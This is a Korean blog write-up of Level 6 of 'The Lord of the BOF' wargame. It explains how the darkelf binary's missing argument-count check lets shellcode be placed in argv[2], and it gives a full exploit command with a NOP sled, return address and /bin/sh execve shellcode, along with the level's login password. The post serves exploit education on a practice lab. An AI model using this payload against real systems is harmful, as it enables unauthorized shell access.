---
layout: post
title: "The Lord of the BOF - Level 6"
comments: true
categories: [LOB]
tags: [LOB]
---
<img data-action="zoom" src='{{ "assets/lob/level6/1.jpg" | relative_url }}' alt='relative'>  

## 1) wolfman/love eyuna 입력하여 로그인하기  

<img data-action="zoom" src='{{ "assets/lob/level6/2.png" | relative_url }}' alt='relative'>  

이전 level5 문제에 argv[1]의 길이를 확인하는 문제가 추가되었습니다.  

<img data-action="zoom" src='{{ "assets/lob/level6/3.png" | relative_url }}' alt='relative'>  

eggshell 방식도 사용 못 하고, buffer 배열은 0x00으로 덮어버리고 48 byte 길이 이상 입력하지 못하는 상태입니다.  

<span style='background-color:#6FE113'>그러나!! darkelf 프로그램에는 argc가 2 이상이라는 조건만 있지 2개여야 하는 조건은 없습니다.</span>  

## 2) argv[2]에 쉘코드 입력하기  

프로그램 실행시 인자를 입력할 때 띄어쓰기로 인자를 구분해줍니다.  

``` bash
./darkelf [인자1] [인자2] [인자3] ...
```

우선 darkelf 소스코드를 새로 컴파일하여 gdb로 실행 가능한 프로그램을 만들었습니다.  
만든 프로그램을 gdb로 실행하여 인자를 2개 넣어주니 아래 그림과 같이 입력한 데이터가 스택에 저장되어 있습니다.  

<img data-action="zoom" src='{{ "assets/lob/level6/4.png" | relative_url }}' alt='relative'>  

위의 정보를 바탕으로 2번째 인자에 쉘코드를 입력하고 RET에는 2번째 인자가 위치할 주소를 임의로 선택해 공격 페이로드 구성하였습니다.  
RET에 0xbffffc40 주소를 넣어보겠습니다.  

``` bash
./darkelf `python -c 'print "\x90"*44+"\x40\xfc\xff\xbf"'` `python -c 'print "\x90"*1000+"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80"'`
```

<img data-action="zoom" src='{{ "assets/lob/level6/5.png" | relative_url }}' alt='relative'>  

<img data-action="zoom" src='{{ "assets/lob/level6/6.png" | relative_url }}' alt='relative'>  